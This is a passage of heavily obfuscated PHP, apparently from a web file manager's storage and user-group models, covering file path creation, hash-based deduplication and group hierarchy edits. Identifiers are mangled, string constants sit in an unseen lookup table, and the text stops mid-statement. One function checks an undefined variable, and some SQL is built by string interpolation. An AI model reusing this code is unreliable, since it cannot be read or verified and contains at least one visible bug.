IO::init($‹Ğ­àıÛ[8]); $´°‹„šê = $this->makeFilePath($Öø˜Íù¾, $ü¿õÚÔ, $÷¸œÊ, $©ÄŸˆ´); $°‰—ùóµ = $ü¿õÚÔ->pathFather($´°‹„šê); static $ïÃİé = false; $”ìâË× = $‹Ğ­àıÛ[1886] . md5($°‰—ùóµ); if (!$ïÃİé && !Cache::get($”ìâË×)) { $ïÃİé = !0; $¢Üö¦ò = IO::mkdir($°‰—ùóµ); if (!IO::exist($¢Üö¦ò . $‹Ğ­àıÛ[799])) { IO::mkfile($¢Üö¦ò . $‹Ğ­àıÛ[799]); } Cache::set($”ìâË×, 1, 3600 * 2); } return $´°‹„šê; } public function makeFilePath($±’€ü¹‚, $¤‘–ê¿±, $ïƒÓĞ²£ = false, $‡³¿±×® = false) { $‘ö¬­›Ü =& $_SERVER[ÏéâËõ‘]; $–Ò‘Ôˆ£ = Model($‘ö¬­›Ü[772])->get($‘ö¬­›Ü[1887]); $Ğ¡âæâŠ = KodIO::defaultIO() . date($‘ö¬­›Ü[1888]); $Äˆƒ§šå = $Ğ¡âæâŠ . rand_string(5) . short_id(100); $±’€ü¹‚ = str_replace($‘ö¬­›Ü[8], $‘ö¬­›Ü[11], KodIO::clear($±’€ü¹‚)); $‘½°Ş´« = $¤‘–ê¿±->ext($±’€ü¹‚); if (!$±’€ü¹‚) { $–Ò‘Ôˆ£ = $‘ö¬­›Ü[1889]; } switch ($–Ò‘Ôˆ£) { case $‘ö¬­›Ü[1890]: $Äˆƒ§šå = $Äˆƒ§šå . $‘ö¬­›Ü[10] . $¤‘–ê¿±->ext($±’€ü¹‚); if ($‘½°Ş´« == $‘ö¬­›Ü[1827]) { $Äˆƒ§šå .= $‘ö¬­›Ü[1557]; } break; case $‘ö¬­›Ü[1891]: $çÃçÂô² = Model($‘ö¬­›Ü[772])->get($‘ö¬­›Ü[773]); $Ï¹íÚù = substr(md5($‘ö¬­›Ü[774] . $çÃçÂô² . date($‘ö¬­›Ü[750])), 0, 8); $èë„—¯Ò = KodIO::defaultDriver(); $Ğ¡âæâŠ = $‘ö¬­›Ü[1234] . $èë„—¯Ò[$‘ö¬­›Ü[399]] . $‘ö¬­›Ü[409] . date($‘ö¬­›Ü[1892]) . $Ï¹íÚù . $‘ö¬­›Ü[8]; if ($‘½°Ş´« == $‘ö¬­›Ü[1827]) { $±’€ü¹‚ .= $‘ö¬­›Ü[1557]; } $óÛ±ˆéø = $‘ö¬­›Ü[1893] . $Ğ¡âæâŠ . $±’€ü¹‚; CacheLock::lock($óÛ±ˆéø); $Äˆƒ§šå = $Ğ¡âæâŠ . $±’€ü¹‚; if (IO::exist($Ğ¡âæâŠ . $±’€ü¹‚)) { $ô»”Á¡¹ = substr($±’€ü¹‚, 0, strlen($±’€ü¹‚) - strlen($‘½°Ş´«)); $š“œì = $‡³¿±×® ? substr($‡³¿±×®, 0, 5) : ($ïƒÓĞ²£ ? substr($ïƒÓĞ²£, 0, 5) : rand_string(5)); $Äˆƒ§šå = $Ğ¡âæâŠ . $ô»”Á¡¹ . $š“œì . $‘ö¬­›Ü[10] . $‘½°Ş´«; } if (IO::isTypeObject($Äˆƒ§šå) && !IO::isUploadServer($Äˆƒ§šå)) { if (IO::exist($Äˆƒ§šå)) { return $Äˆƒ§šå; } $—Ò‘Û¹ = IO::setContent($Äˆƒ§šå, $‘ö¬­›Ü[12]); if (!$—Ò‘Û¹) { show_json($‘ö¬­›Ü[1894], !1); } } CacheLock::unlock($óÛ±ˆéø); break; case $‘ö¬­›Ü[1889]: break; default: break; } return $Äˆƒ§šå; } public function addFileByRemote($ÂĞœû¶Í, $âÛŠÉÒ—, $³èÌÚÕÈ = array()) { $È¯÷àË =& $_SERVER[ÏéâËõ‘]; if (!IO::exist($ÂĞœû¶Í)) { return !1; } $Ï—µë±± = $³èÌÚÕÈ[$È¯÷àË[176]] ? $³èÌÚÕÈ[$È¯÷àË[176]] : $È¯÷àË[12]; $š±ÌÔ¿¢ = IO::hashMd5($ÂĞœû¶Í, $Ï—µë±±); $…Æ×‘‹± = KodIO::defaultDriver(); $—Œ¸İì³ = array($È¯÷àË[585] => IO::size($ÂĞœû¶Í), $È¯÷àË[1895] => 1, $È¯÷àË[420] => $âÛŠÉÒ—, $È¯÷àË[810] => $…Æ×‘‹±[$È¯÷àË[399]], $È¯÷àË[421] => $ÂĞœû¶Í, $È¯÷àË[1896] => $³èÌÚÕÈ[$È¯÷àË[177]] ? $³èÌÚÕÈ[$È¯÷àË[177]] : IO::hashSimple($ÂĞœû¶Í), $È¯÷àË[1897] => $š±ÌÔ¿¢ ? $š±ÌÔ¿¢ : $Ï—µë±±); if ($²Øè°ü´ = $this->addFileCheckExist($—Œ¸İì³[$È¯÷àË[177]], $—Œ¸İì³[$È¯÷àË[176]], $—Œ¸İì³[$È¯÷àË[76]])) { return $²Øè°ü´; } return $this->addFileData($—Œ¸İì³); } private function addFileData($€§¿ì©„) { $‹¡´’Ÿ =& $_SERVER[ÏéâËõ‘]; if (!$€§¿ì©„) { return !1; } $€§¿ì©„[$‹¡´’Ÿ[76]] = intval($€§¿ì©„[$‹¡´’Ÿ[76]]); if (!$€§¿ì©„[$‹¡´’Ÿ[76]] && strlen($€§¿ì©„[$‹¡´’Ÿ[177]]) > 32) { $€§¿ì©„[$‹¡´’Ÿ[76]] = intval(substr($€§¿ì©„[$‹¡´’Ÿ[177]], 32)); } $ò¼÷’Éá = $this->add($€§¿ì©„); return $this->find($ò¼÷’Éá); } public function addFile($à¢óåµ, $ú¡Í¥„‡, $”—¹ÓæÁ = false) { $”€Æª‚‰ =& $_SERVER[ÏéâËõ‘]; $Üß¸¥Ê’ = IO::hashSimple($à¢óåµ); $ªíÒåö = IO::size($à¢óåµ); $°•ÌñÖİ = $ªíÒåö <= 1024 * 1024 * 10 ? IO::hashMd5($à¢óåµ) : $”€Æª‚‰[12]; $ÀÓäçÔà = $”€Æª‚‰[1898] . $Üß¸¥Ê’; CacheLock::lock($ÀÓäçÔà); if ($°•ÌñÖİ && $Üß¸¥Ê’) { $€ïÂã‡¶ = $this->addFileCheckExist($Üß¸¥Ê’, $°•ÌñÖİ, $ªíÒåö); if ($€ïÂã‡¶) { CacheLock::unlock($ÀÓäçÔà); return $€ïÂã‡¶; } } $ÔğœŞÌõ = $this->addFileMake($à¢óåµ, $ªíÒåö, $Üß¸¥Ê’, $°•ÌñÖİ, $ú¡Í¥„‡, $”—¹ÓæÁ); $À÷ú´  = $this->addFileData($ÔğœŞÌõ); CacheLock::unlock($ÀÓäçÔà); if (!$°•ÌñÖİ && $À÷ú´ ) { $this->fileMd5Check($À÷ú´ ); } return $À÷ú´ ; } private function fileMd5Check($ı„É‰ş¹) { $¼ãÔ†ı» =& $_SERVER[ÏéâËõ‘]; $†µ Ï§º = array($ı„É‰ş¹[$¼ãÔ†ı»[468]], $ı„É‰ş¹[$¼ãÔ†ı»[84]]); $šÖÌ‹ö² = $¼ãÔ†ı»[1899] . $ı„É‰ş¹[$¼ãÔ†ı»[84]]; $§Š£íÓ² = $¼ãÔ†ı»[1900] . $ı„É‰ş¹[$¼ãÔ†ı»[468]]; $Šˆ½æ÷· = TaskQueue::add($¼ãÔ†ı»[1901], $†µ Ï§º, $šÖÌ‹ö², $§Š£íÓ²); if (!$Šˆ½æ÷·) { $this->fileMd5Set($ı„É‰ş¹[$¼ãÔ†ı»[468]], $ı„É‰ş¹[$¼ãÔ†ı»[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($’£ßˆæõ, $¿Ö…å‰é) { $°ÄÌ±’¾ =& $_SERVER[ÏéâËõ‘]; $€Å÷‰‰é = $this->find($’£ßˆæõ); if (!$€Å÷‰‰é || $€Å÷‰‰é[$°ÄÌ±’¾[176]]) { return; } $“¢ÍàŸë = IO::hashMd5($¿Ö…å‰é); if (!$“¢ÍàŸë) { return $°ÄÌ±’¾[12]; } $this->where(array($°ÄÌ±’¾[468] => $’£ßˆæõ))->save(array($°ÄÌ±’¾[176] => $“¢ÍàŸë)); } public function addFileMake($²äŒšÉÒ, $Ä‰•¥È«, $©óÎèÈ, $Éá»ÄÀÖ, $Èèà½öÑ, $×üØïÓø) { $á°¶¿€© =& $_SERVER[ÏéâËõ‘]; $Û®öÛ¾Ü = $this->createFileName($Èèà½öÑ, $©óÎèÈ, $Éá»ÄÀÖ); $à¦÷Ù = get_path_father($Û®öÛ¾Ü); $œ ±ğ¬û = get_path_this($Û®öÛ¾Ü); if ($×üØïÓø) { $‘€ì¼™¹ = IO::move($²äŒšÉÒ, $à¦÷Ù, !1, $œ ±ğ¬û); } else { $‘€ì¼™¹ = IO::copy($²äŒšÉÒ, $à¦÷Ù, !1, $œ ±ğ¬û); } if (!$‘€ì¼™¹) { return !1; } $¥„»óœŒ = KodIO::defaultDriver(); $ÅÕÍú™ş = array($á°¶¿€©[585] => $Ä‰•¥È«, $á°¶¿€©[1895] => 1, $á°¶¿€©[420] => $Èèà½öÑ, $á°¶¿€©[810] => $¥„»óœŒ[$á°¶¿€©[399]], $á°¶¿€©[421] => $Û®öÛ¾Ü, $á°¶¿€©[1896] => $©óÎèÈ, $á°¶¿€©[1897] => $Éá»ÄÀÖ); return $ÅÕÍú™ş; } public function addFileCheckExist($‚êùÎÆ, $½€²‘¢, $ñ†µ´¡Ş) { $èï€¯æÅ =& $_SERVER[ÏéâËõ‘]; $Ò¤Ñ“£ = $this->findByHash($‚êùÎÆ, $½€²‘¢); if (!$Ò¤Ñ“£) { return !1; } $ËÍÛÕ«Ó = array($èï€¯æÅ[1895] => intval($Ò¤Ñ“£[$èï€¯æÅ[1902]]) + 1, $èï€¯æÅ[585] => $ñ†µ´¡Ş); $this->where(array($èï€¯æÅ[469] => $Ò¤Ñ“£[$èï€¯æÅ[468]]))->save($ËÍÛÕ«Ó); return $Ò¤Ñ“£; } public function remove($·Ë™¾šø) { $this->linkCountChange($·Ë™¾šø, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÁŞ¼ÆŒÁ) { $this->linkCountChange($ÁŞ¼ÆŒÁ, !0); } public function linkCountChange($´Óğ•½ş, $Èáìè…) { $¡Ú…¨µ– =& $_SERVER[ÏéâËõ‘]; if (!$´Óğ•½ş) { return; } if (!is_array($´Óğ•½ş)) { $´Óğ•½ş = array($´Óğ•½ş); } $òòÆ• = array(); foreach ($´Óğ•½ş as $²˜µş¾) { $ÃÑ¼¦Ù = $²˜µş¾ . $¡Ú…¨µ–[12]; if (!$òòÆ•[$ÃÑ¼¦Ù]) { $òòÆ•[$ÃÑ¼¦Ù] = 0; } $òòÆ•[$ÃÑ¼¦Ù]++; } $ã¤²Î†İ = array(); foreach ($òòÆ• as $²˜µş¾ => $¶å¹Ù) { $ÃÑ¼¦Ù = $¶å¹Ù . $¡Ú…¨µ–[12]; if (!$ã¤²Î†İ[$ÃÑ¼¦Ù]) { $ã¤²Î†İ[$ÃÑ¼¦Ù] = array(); } $ã¤²Î†İ[$ÃÑ¼¦Ù][] = $²˜µş¾; } foreach ($ã¤²Î†İ as $¶å¹Ù => $ÓÖ²‡Ì) { if (!$ÓÖ²‡Ì) { continue; } $¶å¹Ù = $Èáìè… ? $¶å¹Ù : -intval($¶å¹Ù); $‹¢È×ºí = array($¡Ú…¨µ–[468] => array($¡Ú…¨µ–[7], $ÓÖ²‡Ì)); if ($¶å¹Ù < 0) { $‹¢È×ºí[$¡Ú…¨µ–[1902]] = array($¡Ú…¨µ–[1020], abs($¶å¹Ù)); } $this->where($‹¢È×ºí)->setAdd($¡Ú…¨µ–[1902], $¶å¹Ù); } } public function findByHash($å°®¾­ò, $ÕÒ»² = false) { $ÚÈ×„¥¡ =& $_SERVER[ÏéâËõ‘]; if (!$å°®¾­ò && !$ÕÒ»²) { return !1; } $µŸ÷•Å = array($ÚÈ×„¥¡[1896] => $å°®¾­ò); if ($ÕÒ»²) { $µŸ÷•Å = array($ÚÈ×„¥¡[1897] => $ÕÒ»²); } return $this->order($ÚÈ×„¥¡[1903])->where($µŸ÷•Å)->find(); } public function clearEmpty($Òü§£§Î = 0) { $ˆé×Øı½ =& $_SERVER[ÏéâËõ‘]; $‹ÌşêÖ½ = time() - 3600 * 24 * $Òü§£§Î; $€ÒÄºÛ = $ˆé×Øı½[1904] . $‹ÌşêÖ½; $¶»ß¡„Œ = $this->where($€ÒÄºÛ)->select(); if (!$¶»ß¡„Œ) { return; } $ê¼Ù«’¢ = new Task($ˆé×Øı½[1905], $ˆé×Øı½[12], count($¶»ß¡„Œ)); foreach ($¶»ß¡„Œ as $”ÉúÕËº) { $ê¼Ù«’¢->update(1); $this->resetFile($”ÉúÕËº); } $ê¼Ù«’¢->end(); } public function resetFile($àŠµĞÀİ) { $óßõïÜ½ =& $_SERVER[ÏéâËõ‘]; $¹¬ØìÀ” = array($óßõïÜ½[469] => $àŠµĞÀİ[$óßõïÜ½[468]]); $‚ÚÊşĞ× = Model($óßõïÜ½[1332])->where($¹¬ØìÀ”)->count(); $‰îšë¼ö = Model($óßõïÜ½[1906])->where($¹¬ØìÀ”)->count(); $êáÔ‚é = intval($‚ÚÊşĞ×) + intval($‰îšë¼ö); if ($êáÔ‚é == 0) { IO::remove($àŠµĞÀİ[$óßõïÜ½[84]]); Model($óßõïÜ½[1907])->delete($àŠµĞÀİ[$óßõïÜ½[468]]); $this->where($¹¬ØìÀ”)->delete(); $this->metaSet($àŠµĞÀİ[$óßõïÜ½[468]], null, null); return; } if ($àŠµĞÀİ[$óßõïÜ½[1902]] != $êáÔ‚é) { $this->where($¹¬ØìÀ”)->save(array($óßõïÜ½[1895] => $êáÔ‚é)); } } public function storageInfo($ˆ™‚…Ø¶ = false) { $˜¿°àÔ‘ =& $_SERVER[ÏéâËõ‘]; $·…Î¢Ø = $this->count() + 0.0; $«½”ÒÙ = 0; $§€ìĞ…¥ = 1; $²©à‚õÍ = 0; $ÆÜ¸º‹ê = 5000; for ($— ªôä = 0; $— ªôä < $·…Î¢Ø; $— ªôä = $— ªôä + $ÆÜ¸º‹ê) { $Ğ£ôõÉ• = $this->limit($— ªôä, $— ªôä + $ÆÜ¸º‹ê)->select(); foreach ($Ğ£ôõÉ• as $øñ€õ¶Ò) { $§€ìĞ…¥ += $øñ€õ¶Ò[$˜¿°àÔ‘[76]] * $øñ€õ¶Ò[$˜¿°àÔ‘[1902]]; $«½”ÒÙ += $øñ€õ¶Ò[$˜¿°àÔ‘[76]] * ($øñ€õ¶Ò[$˜¿°àÔ‘[1902]] - 1); $²©à‚õÍ += $øñ€õ¶Ò[$˜¿°àÔ‘[1902]]; } } $Â­¨‚‡Œ = array($˜¿°àÔ‘[1908] => $§€ìĞ…¥, $˜¿°àÔ‘[1909] => $«½”ÒÙ, $˜¿°àÔ‘[1910] => $«½”ÒÙ / $§€ìĞ…¥, $˜¿°àÔ‘[80] => $·…Î¢Ø, $˜¿°àÔ‘[1911] => $²©à‚õÍ); return $Â­¨‚‡Œ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\x70"; protected $tableMeta = array("\164\141\142\154\x65\116\141\155\x65" => "\x67\162\157\165\160\137\155\145\164\141", "\155\145\164\x61\x46\x69\x65\x6c\x64" => "\x67\x72\x6f\165\x70\111\104"); protected function cacheFunctionAlias($ãŒÅàÚ´) { $õøñ¨¿à =& $_SERVER[ÏéâËõ‘]; return array($õøñ¨¿à[1912] => array($ãŒÅàÚ´[0], $õøñ¨¿à[1913]), $õøñ¨¿à[1914] => array($ãŒÅàÚ´[0], $õøñ¨¿à[1915])); } protected function getInfo($Í˜™ªºİ, $ÛÄ”Œ»ô = false) { $éÔå‡İ = $this->getInfoSimple($Í˜™ªºİ); if (!$éÔå‡İ) { return !1; } if ($ÛÄ”Œ»ô) { return $this->_listDataApplyItem($éÔå‡İ); } return $this->cacheFunctionGet($_SERVER[ÏéâËõ‘][1916], $Í˜™ªºİ); } protected function getInfoSimple($¥Øõ¢Ï, $¼‘ˆÓ½© = false) { $æàËˆ¼Š =& $_SERVER[ÏéâËõ‘]; if ($¼‘ˆÓ½©) { $Ôµ´çõÉ = array($æàËˆ¼Š[1834] => intval($¥Øõ¢Ï)); $´Îô©¤Ë = $this->where($Ôµ´çõÉ)->find(); return is_array($´Îô©¤Ë) ? $´Îô©¤Ë : array(); } return $this->cacheFunctionGet($æàËˆ¼Š[1917], $¥Øõ¢Ï); } protected function groupAdd($ÓûÈ°¥ß) { $¤İ£ë‡Á =& $_SERVER[ÏéâËõ‘]; if (!$ÓûÈ°¥ß[$¤İ£ë‡Á[432]] && isset($ÓûÈ°¥ß[$¤İ£ë‡Á[1834]]) && $ÓûÈ°¥ß[$¤İ£ë‡Á[1834]] == 1) { if ($ì’‰ÅÀ¦ = $this->getInfoSimple($ÓûÈ°¥ß[$¤İ£ë‡Á[1834]], !0)) { return $ÓûÈ°¥ß[$¤İ£ë‡Á[1834]]; } } else { $ì’‰ÅÀ¦ = $this->getInfoSimple($ÓûÈ°¥ß[$¤İ£ë‡Á[432]]); if (!$ì’‰ÅÀ¦) { return !1; } } $¶ÕËü¯” = $¤İ£ë‡Á[531]; if ($ì’‰ÅÀ¦[$¤İ£ë‡Á[521]]) { $¶ÕËü¯” = $ì’‰ÅÀ¦[$¤İ£ë‡Á[521]] . $ì’‰ÅÀ¦[$¤İ£ë‡Á[1834]] . $¤İ£ë‡Á[50]; } $°ü…ıåó = array($¤İ£ë‡Á[420] => $this->groupNameAuto($ÓûÈ°¥ß[$¤İ£ë‡Á[432]], $ÓûÈ°¥ß[$¤İ£ë‡Á[32]]), $¤İ£ë‡Á[401] => $ÓûÈ°¥ß[$¤İ£ë‡Á[432]], $¤İ£ë‡Á[590] => $¶ÕËü¯”, $¤İ£ë‡Á[1918] => $ÓûÈ°¥ß[$¤İ£ë‡Á[1821]], $¤İ£ë‡Á[1919] => 0, $¤İ£ë‡Á[1838] => 0); if (isset($ÓûÈ°¥ß[$¤İ£ë‡Á[1858]])) { $°ü…ıåó[$¤İ£ë‡Á[1858]] = $ÓûÈ°¥ß[$¤İ£ë‡Á[1858]]; } else { $íûºİß = $this->max($¤İ£ë‡Á[1858]); if (!$íûºİß) { $íûºİß = 0; } $°ü…ıåó[$¤İ£ë‡Á[1858]] = $íûºİß + 1; } if (!empty($ÓûÈ°¥ß[$¤İ£ë‡Á[1834]])) { $°ü…ıåó[$¤İ£ë‡Á[1834]] = $ÓûÈ°¥ß[$¤İ£ë‡Á[1834]]; } $İÈŒÈş‡ = $this->add($°ü…ıåó); $this->setNamePinyin($İÈŒÈş‡, $°ü…ıåó[$¤İ£ë‡Á[32]]); if (isset($ÓûÈ°¥ß[$¤İ£ë‡Á[1920]])) { $this->metaSet($İÈŒÈş‡, array($¤İ£ë‡Á[1920] => $ÓûÈ°¥ß[$¤İ£ë‡Á[1920]], $¤İ£ë‡Á[1921] => $ÓûÈ°¥ß[$¤İ£ë‡Á[1921]])); unset($ÓûÈ°¥ß[$¤İ£ë‡Á[1920]]); unset($ÓûÈ°¥ß[$¤İ£ë‡Á[1921]]); } Model($¤İ£ë‡Á[1332])->groupRootAdd($İÈŒÈş‡); return $İÈŒÈş‡; } protected function groupEdit($ã“—²—, $±Ñè¬Ø÷) { $å«•ºÎª =& $_SERVER[ÏéâËõ‘]; $±µÁÈÎ = $this->getInfoSimple($ã“—²—); if (!$±µÁÈÎ) { return !1; } if (!empty($±Ñè¬Ø÷[$å«•ºÎª[432]])) { $ü‡ ––û = $this->getInfoSimple($±Ñè¬Ø÷[$å«•ºÎª[432]]); if (!$ü‡ ––û) { return !1; } if ($±µÁÈÎ[$å«•ºÎª[1834]] == $ü‡ ––û[$å«•ºÎª[1834]]) { return !1; } if ($±Ñè¬Ø÷[$å«•ºÎª[432]] != $±µÁÈÎ[$å«•ºÎª[432]]) { if ($ü‡ ––û[$å«•ºÎª[521]] !== $±µÁÈÎ[$å«•ºÎª[521]] && strpos($ü‡ ––û[$å«•ºÎª[521]], $±µÁÈÎ[$å«•ºÎª[521]] . $±µÁÈÎ[$å«•ºÎª[1834]] . $å«•ºÎª[50]) === 0) { return !1; } $±Ñè¬Ø÷[$å«•ºÎª[590]] = $ü‡ ––û[$å«•ºÎª[521]] . $±Ñè¬Ø÷[$å«•ºÎª[432]] . $å«•ºÎª[50]; $this->_changeChildLevel($±µÁÈÎ, $ü‡ ––û); } } if (isset($±Ñè¬Ø÷[$å«•ºÎª[32]])) { $this->setNamePinyin($ã“—²—, $±Ñè¬Ø÷[$å«•ºÎª[32]]); } if (isset($±Ñè¬Ø÷[$å«•ºÎª[1920]])) { $this->metaSet($ã“—²—, array($å«•ºÎª[1920] => $±Ñè¬Ø÷[$å«•ºÎª[1920]], $å«•ºÎª[1921] => $±Ñè¬Ø÷[$å«•ºÎª[1921]])); unset($±Ñè¬Ø÷[$å«•ºÎª[1920]]); unset($±Ñè¬Ø÷[$å«•ºÎª[1921]]); } $this->_clearChildrenCache($±µÁÈÎ); return $this->where(array($å«•ºÎª[1922] => $ã“—²—))->save($±Ñè¬Ø÷); } private function _clearChildrenCache($œ±îöá) { $õ‡’ïÌ =& $_SERVER[ÏéâËõ‘]; $ÚŞÕÆÄÈ = array($õ‡’ïÌ[590] => array($õ‡’ïÌ[550], $œ±îöá[$õ‡’ïÌ[521]] . $œ±îöá[$õ‡’ïÌ[1834]] . $õ‡’ïÌ[551])); $àÑÇŒ—˜ = $this->field($õ‡’ïÌ[1834])->where($ÚŞÕÆÄÈ)->select(); foreach ($àÑÇŒ—˜ as $Ş¶²Ğİ) { $this->_clearCache($Ş¶²Ğİ[$õ‡’ïÌ[1834]]); } } private function _clearCache($áøËá§Ô) { $ò´÷“Ğæ =& $_SERVER[ÏéâËõ‘]; $this->cacheFunctionClear($ò´÷“Ğæ[1916], $áøËá§Ô); $this->cacheFunctionClear($ò´÷“Ğæ[1917], $áøËá§Ô); } private function _changeChildLevel($©­š÷ôı, $š×–§¸ê, $ë³Èúøˆ = false) { $½˜€Ç¾à =& $_SERVER[ÏéâËõ‘]; $æÄÜ¦† = $©­š÷ôı[$½˜€Ç¾à[521]] . $©­š÷ôı[$½˜€Ç¾à[1834]] . $½˜€Ç¾à[50]; $øèØ¹§ƒ = $š×–§¸ê[$½˜€Ç¾à[521]] . $š×–§¸ê[$½˜€Ç¾à[1834]] . $½˜€Ç¾à[50] . $©­š÷ôı[$½˜€Ç¾à[1834]] . $½˜€Ç¾à[50]; if ($ë³Èúøˆ) { $øèØ¹§ƒ = $š×–§¸ê[$½˜€Ç¾à[521]] . $š×–§¸ê[$½˜€Ç¾à[1834]] . $½˜€Ç¾à[50]; } $í¥şƒâ® = array($½˜€Ç¾à[590] => array($½˜€Ç¾à[550], $©­š÷ôı[$½˜€Ç¾à[521]] . $©­š÷ôı[$½˜€Ç¾à[1834]] . $½˜€Ç¾à[551])); $¨…÷«ª = array($½˜€Ç¾à[590] => array($½˜€Ç¾à[599], "\162\x65\160\154\x61\x63\145\x28\160\141\162\145\156\164\114\x65\x76\x65\x6c\x2c\47{$æÄÜ¦†}\47\54\x27{$øèØ¹§ƒ}\x27\51")); $this->_clearChildrenCache($©­š÷ôı); $this->where($í¥şƒâ®)->data($¨…÷«ª)->save(); } public function setNamePinyin($İ£®¯ØÚ, $“É•ò¸ô = false) { $ÅÂŞ¾„ë =& $_SERVER[ÏéâËõ‘]; if (!$“É•ò¸ô) { $ôÄ¨¨°ö = $this->getInfoSimple($İ£®¯ØÚ); $“É•ò¸ô = $ôÄ¨¨°ö[$ÅÂŞ¾„ë[32]]; } if (!Input::check($“É•ò¸ô, $ÅÂŞ¾„ë[593])) { $this->metaSet($İ£®¯ØÚ, $ÅÂŞ¾„ë[465], null); $this->metaSet($İ£®¯ØÚ, $ÅÂŞ¾„ë[464], null); return; } $¢ş¨Ê“ = array($ÅÂŞ¾„ë[465] => str_replace($ÅÂŞ¾„ë[53], $ÅÂŞ¾„ë[12], Pinyin::get($“É•ò¸ô)), $ÅÂŞ¾„ë[464] => Pinyin::get($“É•ò¸ô, $ÅÂŞ¾„ë[594])); $this->metaSet($İ£®¯ØÚ, $¢ş¨Ê“); } protected function groupStatus($ˆÒ«Ë¯Œ, $ŸÎñ¤ÅÈ) { $ƒÅ¡ı™Í =& $_SERVER[ÏéâËõ‘]; $óÖŠËÃ = $this->getInfoSimple($ˆÒ«Ë¯Œ); if (!$óÖŠËÃ) { return !1; } if ($ŸÎñ¤ÅÈ == $ƒÅ¡ı™Í[88]) { $Î¹¨‚Ë’ = $this->parentLevelArray($óÖŠËÃ[$ƒÅ¡ı™Í[521]]); } else { $ŸÛƒ”²× = array($ƒÅ¡ı™Í[590] => array($ƒÅ¡ı™Í[550], $óÖŠËÃ[$ƒÅ¡ı™Í[521]] . $óÖŠËÃ[$ƒÅ¡ı™Í[1834]] . $ƒÅ¡ı™Í[551])); $Î¹¨‚Ë’ = $this->where($ŸÛƒ”²×)->field($ƒÅ¡ı™Í[1834])->select(); $Î¹¨‚Ë’ = array_to_keyvalue($Î¹¨‚Ë’, $ƒÅ¡ı™Í[12], $ƒÅ¡ı™Í[1834]); } $Î¹¨‚Ë’[] = $óÖŠËÃ[$ƒÅ¡ı™Í[1834]]; $”¿ëÄ÷Ê = array(); foreach ($Î¹¨‚Ë’ as $ˆÒ«Ë¯Œ) { $”¿ëÄ÷Ê[] = array($ƒÅ¡ı™Í[1834] => $ˆÒ«Ë¯Œ, $ƒÅ¡ı™Í[94] => $ƒÅ¡ı™Í[752], $ƒÅ¡ı™Í[374] => $ŸÎñ¤ÅÈ); $this->_clearCache($ˆÒ«Ë¯Œ); } return Model($ƒÅ¡ı™Í[1923])->addAll($”¿ëÄ÷Ê, array(), !0); } protected function groupRemove($‹”ıÈ, $±”ìİÁ = false) { $Æ¥’Ë¡ƒ =& $_SERVER[ÏéâËõ‘]; $óº¬ã© = array($Æ¥’Ë¡ƒ[1834] => $‹”ıÈ); $şÕçñèÛ = $this->where($óº¬ã©)->find(); if (!$şÕçñèÛ || $şÕçñèÛ[$Æ¥’Ë¡ƒ[432]] == 0) { return !1; } if (!$±”ìİÁ) { $ó›³ş  = $this->getInfoSimple($şÕçñèÛ[$Æ¥’Ë¡ƒ[432]]); $this->_changeChildLevel($şÕçñèÛ, $ó›³ş , !0); $this->where(array($Æ¥’Ë¡ƒ[432] => $‹”ıÈ))->save(array($Æ¥’Ë¡ƒ[432] => $şÕçñèÛ[$Æ¥’Ë¡ƒ[432]])); } Model($Æ¥’Ë¡ƒ[1923])->where($óº¬ã©)->delete(); Model($Æ¥’Ë¡ƒ[1924])->where($óº¬ã©)->delete(); Model($Æ¥’Ë¡ƒ[827])->groupRootRemove($‹”ıÈ); return $this->where($óº¬ã©)->delete(); } protected function groupSort($Éûİó“Ï) { $æ¦Öë¡  =& $_SERVER[ÏéâËõ‘]; $¢Ÿ®õ¡¤ = array(); foreach ($Éûİó“Ï as $¹à·¬» => $­†É‘Ê) { $¢Ÿ®õ¡¤[] = array($æ¦Öë¡ [1834], $­†É‘Ê, $æ¦Öë¡ [1858], $¹à·¬» + 1); } $this->saveAll($¢Ÿ®õ¡¤); } public function listData() { $ø‡è®” = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ø‡è®”[$_SERVER[ÏéâËõ‘][369]]); return $ø‡è®”; } private function _makeOrder($Íş …¿÷ = '') { $è‘Ä†¡¬ =& $_SERVER[ÏéâËõ‘]; $¬óØÂ” = array($è‘Ä†¡¬[1834], $è‘Ä†¡¬[32], $è‘Ä†¡¬[1823], $è‘Ä†¡¬[200]); $’ñµ° = array($è‘Ä†¡¬[450] => $è‘Ä†¡¬[451], $è‘Ä†¡¬[452] => $è‘Ä†¡¬[453]); $´ÔÖåÑã = Input::get($è‘Ä†¡¬[457], $è‘Ä†¡¬[7], $è‘Ä†¡¬[1838], $¬óØÂ”); $ñˆ‘¹Õç = Input::get($è‘Ä†¡¬[458], $è‘Ä†¡¬[7], $è‘Ä†¡¬[1925], array($è‘Ä†¡¬[1925], $è‘Ä†¡¬[452])); $ñˆ‘¹Õç = $’ñµ°[$ñˆ‘¹Õç]; $Íş …¿÷ = $Íş …¿÷ . "{$´ÔÖåÑã}\40{$ñˆ‘¹Õç}\x2c\x20\x67\162\157\x75\x70\x49\104\40\x61\163\x63"; return $this->order($Íş …¿÷); } public function listChild($¼¸÷ù…) { $ë˜ïãæÎ =& $_SERVER[ÏéâËõ‘]; $Ãò«Æáœ = $this->where(array($ë˜ïãæÎ[432] => $¼¸÷ù…))->_makeOrder()->selectPage(200); $this->_listDataApply($Ãò«Æáœ[$ë˜ïãæÎ[369]]); return $Ãò«Æáœ; } public function listChildIds($†îğü«”) { $Ì®Ğ›¹ =& $_SERVER[ÏéâËõ‘]; if (is_string($¶¯ôİÜ)) { $†îğü«” = explode($Ì®Ğ›¹[50], $†îğü«”); } $“ªã”Ñº = $this->where(array($Ì®Ğ›¹[1834] => array($Ì®Ğ›¹[7], $†îğü«”)))->field($Ì®Ğ›¹[1926])->select(); if (!$“ªã”Ñº) { return !1; } $şË…ßş€ = array(); foreach ($“ªã”Ñº as $±û“¼¸¯) { $şË…ßş€[] = "\163\x65\154\145\x63\164\40\147\162\157\x75\x70\111\104\40\146\162\157\x6d\40\x60\x67\x72\x6f\165\x70\x60\40\167\150\x65\x72\145\x20\x70\141\x72\145\156\x74\x4c\145\166\145\154\x20\x6c\151\x6b\x65\40\x27{$±û“¼¸¯[$Ì®Ğ›¹[521]]}{$±û“¼¸¯[$Ì®Ğ›¹[1834]]}\54\x25\x27"; } $şË…ßş€ = implode($Ì®Ğ›¹[1927], $şË…ßş€); $“ªã”Ñº = $this->query($şË…ßş€); if (!$“ªã”Ñº) { return array(); } $†îğü«” = 